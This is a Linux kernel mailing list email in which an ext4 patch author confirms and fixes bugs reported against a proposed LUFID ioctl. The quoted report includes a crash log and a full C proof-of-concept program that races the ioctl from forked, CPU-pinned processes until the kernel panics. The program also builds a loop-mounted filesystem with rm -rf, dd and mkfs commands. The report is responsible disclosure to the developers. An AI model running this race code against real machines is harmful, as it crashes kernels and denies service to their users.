Received: from mail-yw1-f175.google.com (mail-yw1-f175.google.com [209.85.128.175])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 549AB221723
	for <linux-ext4@vger.kernel.org>; Wed, 24 Jun 2026 12:33:22 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.128.175
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1782304403; cv=pass; b=fSw+TSuqKhKvAYI3C266J4WhJAb2I6JnBLyYo4iema+2meoPZ5vSvkxqhmDAPoOiYuViqWAELGLsrwBV4RBx6AzwKiu2rP/+bO7JHSrDryKH6rlkwgkJRsoTXqz1w8KxfY/8wIgDVFd3ELgx7ORNJC3Ty8Qq6+uAA9KQn/7xB+U=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1782304403; c=relaxed/simple;
	bh=kY5ABHvPzSieba4p4i7ESG01+qD4QO+dw5f1mtRIUEg=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=NCpnszFquBgkj3Q+XcqksDE9kpHO5fpCLJRlxQp2TWLP1kEzz+chyzfv6Xwby/163mAlu04/ZYPGdAQHxB9r3SaaAsUW3sfFtjSGLGuIbk09Qk4nnBCOO8YLrg+4D0MHnI9ID5ugpHBOJJ0l0H9htAbTmRh3ycSOmtF+u17Ndgc=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=iUwtWZKj; arc=pass smtp.client-ip=209.85.128.175
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="iUwtWZKj"
Received: by mail-yw1-f175.google.com with SMTP id 00721157ae682-7dbcb505578so10891177b3.3
        for <linux-ext4@vger.kernel.org>; Wed, 24 Jun 2026 05:33:22 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1782304401; cv=none;
        d=google.com; s=arc-20240605;
        b=W6svhcTiQfHOmNmhZgT8x2++7nya5Z2sy0FPfroIf6fKvncw98zGJJTikx9YbLQ+fP
         tOXBsOsnElGX/q4F0gA4OmlKxqeBR14X1GH2yHoeRv1V3UkERGZcSUy3I8DdEUCguDVa
         6snokqnuMgKcXBH/dMtT870M+IGIjsAX1RO+nbEooUkhuTTtMHJgs9LQKjMLqU92WVB5
         dQRdIFVXG6o+UcdVbEVjEyQDQYwUrc+cs9KrvR8RWQpPGSIkVRlzgTWytqirJoxzML2+
         ngLu6gvKQqPZ/hVYlYdbS903QQCXz5JBzIgqd8y8L4fxj8DHtqGO640JV8tsPz1NkAaq
         hv/g==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:dkim-signature;
        bh=lOA0leNyBg0GwokNzkKsWkbqUZ/PN9LB3gsQZgKrRss=;
        fh=4Xx4GEChmv5yR2Ab0BiPXtJFILOUEQDwPOA8KwqOEVw=;
        b=XVer6jP45G9+NJCeGlpYmTaBy0YUf17+B1XvarSmMPrgQSOPQQ0fBy9O3uooBEsae1
         XqoUTpE3F1LwV5/xMh+sTq4INUteGRAHuiM+BGZzGnOjMUjMNSbrsmve7jffU1abTUfl
         0nNM1Im1R+WlrrD8XMH5RiyeslXoiTd4yAXY1PMzRSz6Wdtttpt6JmA7y/miWPxcOL4k
         ANtte5xTFT+Vn+Yf64iKpkCpaOhZXqqOd1h7/RqiV9deQNWWO1U8mTk+VscJyXb0TJzQ
         5c9YkBXJJ6gBed6zFDPuvFRfpS7NPyUUy4zSZs8Lv2W0KMQcMF9B6xdMaIoRfXQNwk7C
         PECQ==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1782304401; x=1782909201; darn=vger.kernel.org;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:from:to:cc:subject:date
         :message-id:reply-to;
        bh=lOA0leNyBg0GwokNzkKsWkbqUZ/PN9LB3gsQZgKrRss=;
        b=iUwtWZKjiqP7I4A8lpbDBsm3V3Wo+eUKq5H+zXCBwCa5gq8g1boLksPUomDm8hgDkQ
         nG2djWhKLWJ5Sx4gQvzl0CaU9mf7hO8zB8yFgoQNDq2/szgE1pl43UUjX+FJQ3/YZcQ5
         C8sC4+26CPIhKBBL5VHCbukbNSf/le/3Dyf+0z+KTb3K62nK9IWtb+XNzSeEbCWq0nYQ
         hZNuAqmnnwzf57OXOiDbPj08wd2Z+gu/3YSCMsEBhl7CBodtjB7yocTwk6wJHkf9Ilel
         rifYTEZ0YYOs0894XUOfkt00d852tXJalbj8ShkWXmnSZ0No8n7hknQ4UnUJinLtYDwd
         6jwg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1782304401; x=1782909201;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:x-gm-gg:x-gm-message-state:from
         :to:cc:subject:date:message-id:reply-to;
        bh=lOA0leNyBg0GwokNzkKsWkbqUZ/PN9LB3gsQZgKrRss=;
        b=gNz+7neXqqEeWLaowV0nlj1he55P3dYKEn6/gGa9XS7Ko7t2VaXojYJajFDDlYxEdX
         50aXORY4lOdoBp9y9+tD7E59+MPEG0WXcloEeVxFJ4CTjuTREl1N42b3qXYQc/0l9QIN
         HD25op1LcHtiye23W2cYbYipAPVwV10TnXstzh0l6aUcYsdElJul3I4fEN2rrqaPsTg0
         WRJpePt0RPG4Ff5TiSz2pGNMiMbSjys8TnaA5MqpmtouGFF1wLuzwxV5SNC7u0Nostx+
         CPInMpeb4a7ZXHKqqyfb67jqRV9yowqyi4AphZzj2haRcbgT9XEa+zVLdN2NhREirKvt
         jPOg==
X-Gm-Message-State: AOJu0YzKgg+wlAjy2ZB5plc3oCtmJgNcVqR710bjJMZkNcJ1FausxFp2
	9sc/UEofE3egLLI//lkXLC+Tcvvmu9KK/eatjxfMgFmWtwBzdEkzkIW2H/ZP/Um6dmoZJ/Bgqoc
	YWcHH4WB4shpeDynzAIRKFNveaSjO4zg=
X-Gm-Gg: AfdE7cnt2MlZap9iVzDHOjOXmc808QGqOfyX9jdXLvlNYnLgQv0wQ9JYfLG9brAEV0G
	+lXRjzaK8bjyUhs07uB+nepfumS928AgNFhjsZ8MQLNIQIXwRI96vLnPlWj3F3yyYdhAQaxhXWS
	Gul/wzQOHioFynPuLwQKaHbmp9XqcuZlU8SrazAesh7V5Rrvt8GZPwg7Bv5AFX8NKvY7uUZsP0Y
	heGJDDpgsolPop5wYtS5w7UJS2gdmK9FqzkqglPEuBQ0Bg6/tgtN47/vyudZr8CDuBMMlx7z/1c
	/ZRVkVGTRaAFl5Uv6ZyIPWSTe34vXQ==
X-Received: by 2002:a05:690c:b03:b0:7b3:3a49:752 with SMTP id
 00721157ae682-807ef05a04amr29905207b3.41.1782304401344; Wed, 24 Jun 2026
 05:33:21 -0700 (PDT)
Precedence: bulk
X-Mailing-List: linux-ext4@vger.kernel.org
List-Id: <linux-ext4.vger.kernel.org>
List-Subscribe: <mailto:linux-ext4+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-ext4+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <20260619191022.27008-1-ablagodarenko@thelustrecollective.com>
 <20260619191022.27008-11-ablagodarenko@thelustrecollective.com> <tencent_2D1051E0281A7550C4CA60798593BF905B09@qq.com>
In-Reply-To: <tencent_2D1051E0281A7550C4CA60798593BF905B09@qq.com>
From: Artem Blagodarenko <artem.blagodarenko@gmail.com>
Date: Wed, 24 Jun 2026 13:33:10 +0100
X-Gm-Features: AVVi8Cc5efZGVGqz-1iLGq0jobKnrz34OqNPyjCCIsUX4qd9oeJ41rxM7naGNzk
Message-ID: <CA+rD4x-FRNsuaujWtnXYo6fK3FgD-BWuMb8w85NL9eAPMpai=w@mail.gmail.com>
Subject: Re: [PATCH v3 10/10] ext4: Add EXT4_IOC_SET_LUFID ioctl for setting
 LUFID on directory entries
To: XIAO WU <xiaowu.417@qq.com>
Cc: linux-ext4@vger.kernel.org, adilger.kernel@dilger.ca, 
	Andreas Dilger <adilger@dilger.ca>
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

Hi Xiao,

Thanks for the detailed reproducer and analysis of the race condition on
EXT4_I(inode)->i_dirdata, and for the additional issues you flagged from
the same Sashiko AI review. I've confirmed all of them by reading the
code directly and fixed each one:

- ddh_length was missing the header's own length (only esl_data_len was
used), which silently dropped the last byte of every LUFID payload set
through this ioctl. Fixed to include the header size, and tightened the
esl_data_len upper bound so the result can't wrap the __u8 field.
- '.' and '..' are now rejected -- they must stay the fixed first two
entries of the directory's first block, and can't go through this
ioctl's general delete+re-add path.
- The handler now checks inode_permission(dir, MAY_WRITE) before
proceeding, instead of relying only on mnt_want_write_file().
- ext4_dirdata_set_lufid() now also locks the target inode (nested under
the parent directory, consistently dir-then-inode) for the
i_dirdata set/use/restore window, closing the race you reproduced
between concurrent calls on different hardlinks of the same inode.

All four fixes will be included in the next version of this series.

Thanks again for the thorough reproducers -- they were a big help in
pinning down the root causes.

Artem

On Mon, 22 Jun 2026 at 18:21, XIAO WU <xiaowu.417@qq.com> wrote:
>
> Hi Artem,
>
> I came across the Sashiko AI review [1] of this patch and was able to
> reproduce a kernel crash triggered by a race condition in
> ext4_dirdata_set_lufid().  I wanted to share the evidence in case it's
> helpful.
>
> The core issue is that EXT4_I(inode)->i_dirdata is set to a
> stack-local pointer without locking the target inode:
>
>  > +static int ext4_dirdata_set_lufid(struct inode *dir,
>  > +                                  const char *name, int namelen,
>  > +                                  struct ext4_dentry_param *edp)
>  > +{
>  > ...
>  > +    EXT4_I(inode)->i_dirdata =3D edp;
>
> The function locks the parent directory (inode_lock(dir)), but does NOT
> lock the target inode.  If two threads operate on different hardlinks
> to the *same* inode (in different directories), they race to overwrite
> inode->i_dirdata with each other's stack-local edp pointers.  The
> winner's stack pointer is later consumed through ext4_add_entry() =E2=86=
=92
> ext4_lookup() =E2=86=92 ext4_dentry_get_fid(), reading from a stale or
> overwritten stack frame.
>
> With KASAN enabled this manifests as a null-ptr-deref because KASAN
> poisons freed stack memory.
>
> [Reproduction]
>
> The PoC creates two subdirectories (/mnt/test/da and /mnt/test/db),
> hardlinks the same file into both, then runs 8 child processes that
> hammer EXT4_IOC_SET_LUFID on the two directories simultaneously via
> ioctl().  Each child is pinned to a specific CPU to maximize the race
> window.  The kernel panics within a few seconds.
>
> [Crash log =E2=80=94 kernel 7.1.0-next-20260618, CONFIG_KASAN=3Dy, SMP]
>
>    Oops: general protection fault, probably for non-canonical address
>    0xdffffc0000000000: 0000 [#1] SMP KASAN NOPTI
>    KASAN: null-ptr-deref in range [0x0000000000000000-0x0000000000000007]
>
>    RIP: 0010:ext4_dirdata_set_lufid+0x3e8/0xb00
>    RAX: dffffc0000000000 RBX: 0000000000000000
>    ...
>    Call Trace:
>     <TASK>
>     ext4_ioctl_set_lufid+0x2d9/0x350
>     __ext4_ioctl+0x1d2/0x43c0
>     __x64_sys_ioctl+0x193/0x210
>     do_syscall_64+0x129/0x850
>     entry_SYSCALL_64_after_hwframe+0x77/0x7f
>     </TASK>
>
> The same crash was independently hit by a second thread at [#2],
> confirming the race condition.
>
> Additionally, the Sashiko review [1] noted a few other issues in this
> patch that may be worth checking:
>
> - The ioctl does not reject '.' and '..' =E2=80=94 modifying these specia=
l
>    entries via EXT4_IOC_SET_LUFID would corrupt the directory layout.
>
> - The ddh_length computation in ext4_find_dest_de() appears to
>    exclude the header size (1 byte), which can cause the header and
>    data insertion to overflow by one byte into the adjacent directory
>    entry when (fname_len + esl_data_len) % 4 =3D=3D 0.
>
> - The handler calls mnt_want_write_file() but omits an explicit
>    inode_permission(dir, MAY_WRITE) check, which may allow an
>    unprivileged user with read-only access to the directory to
>    modify directory entries.
>
> The PoC is attached below.  It compiles with:
>
>    gcc -o poc poc.c -static
>
> [1]
> https://sashiko.dev/#/patchset/20260619191022.27008-1-ablagodarenko%40the=
lustrecollective.com
>      (Sashiko AI code review =E2=80=94 "Dangling Pointer", Severity: Crit=
ical)
>
> Thanks,
> XIAO
>
> // PoC: race on EXT4_I(inode)->i_dirdata via EXT4_IOC_SET_LUFID
> #define _GNU_SOURCE
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <unistd.h>
> #include <stdint.h>
> #include <sys/types.h>
> #include <sys/stat.h>
> #include <sys/ioctl.h>
> #include <sys/mount.h>
> #include <sys/wait.h>
> #include <fcntl.h>
> #include <errno.h>
> #include <sched.h>
> #include <linux/loop.h>
> #include <linux/fs.h>
>
> struct ext4_set_lufid {
>      uint8_t  esl_name_len;
>      char     esl_name[256];
>      uint8_t  esl_data_len;
>      char     esl_data[255];
> };
> #define EXT4_IOC_SET_LUFID _IOW('f', 47, struct ext4_set_lufid)
> #define MNT "/mnt/test"
>
> int main(void)
> {
>      int fd, ret;
>
>      setvbuf(stdout, NULL, _IONBF, 0);
>      printf("=3D=3D=3D EXT4_IOC_SET_LUFID PoC =3D=3D=3D\n\n");
>
>      /* Setup loopback ext4 filesystem */
>      system("umount -l /mnt/test 2>/dev/null; losetup -d /dev/loop0
> 2>/dev/null; true");
>      system("rm -rf /mnt/test /tmp/img 2>/dev/null");
>      mkdir(MNT, 0755);
>      system("dd if=3D/dev/zero of=3D/tmp/img bs=3D1M count=3D64 2>/dev/nu=
ll");
>      system("losetup /dev/loop0 /tmp/img 2>/dev/null");
>      system("mkfs.ext4 -F -b 1024 -O ^metadata_csum,^64bit,^flex_bg
> /dev/loop0 2>/dev/null");
>      if (mount("/dev/loop0", MNT, "ext4", 0, NULL) !=3D 0) {
>          printf("Mount failed\n"); return 1;
>      }
>
>      /* Create target file with two hardlinks in different directories */
>      mkdir(MNT "/da", 0755);
>      mkdir(MNT "/db", 0755);
>      close(open(MNT "/t", O_CREAT|O_WRONLY, 0644));
>      link(MNT "/t", MNT "/da/t");
>      link(MNT "/t", MNT "/db/t");
>
>      printf("Racing EXT4_IOC_SET_LUFID on hardlinks...\n");
>      for (int r =3D 0; r < 20; r++) {
>          pid_t kids[8];
>          for (int i =3D 0; i < 8; i++) {
>              kids[i] =3D fork();
>              if (kids[i] =3D=3D 0) {
>                  /* Half target /da, half target /db =E2=80=94 same inode=
 */
>                  const char *dir =3D (i < 4) ? MNT "/da" : MNT "/db";
>                  cpu_set_t cpuset;
>                  CPU_ZERO(&cpuset);
>                  CPU_SET(i % 2, &cpuset);
>                  sched_setaffinity(0, sizeof(cpu_set_t), &cpuset);
>
>                  for (int j =3D 0; j < 5000; j++) {
>                      struct ext4_set_lufid l =3D {0};
>                      l.esl_name_len =3D 2;
>                      memcpy(l.esl_name, "t\0", 2);
>                      l.esl_data_len =3D 5;
>                      memcpy(l.esl_data, "ABCDE", 5);
>                      int f =3D open(dir, O_RDONLY);
>                      if (f >=3D 0) {
>                          ioctl(f, EXT4_IOC_SET_LUFID, &l);
>                          close(f);
>                      }
>                  }
>                  _exit(0);
>              }
>          }
>          for (int i =3D 0; i < 8; i++) {
>              int ws;
>              waitpid(kids[i], &ws, 0);
>          }
>          printf("."); fflush(stdout);
>      }
>      printf("\n");
>
>      printf("\n=3D=3D=3D dmesg =3D=3D=3D\n"); fflush(stdout);
>      system("dmesg | grep -iE 'KASAN|BUG:|Call Trace|general protection'
> | tail -40");
>
>      umount(MNT);
>      system("losetup -d /dev/loop0 2>/dev/null");
>      printf("Done.\n");
>      return 0;
> }
>
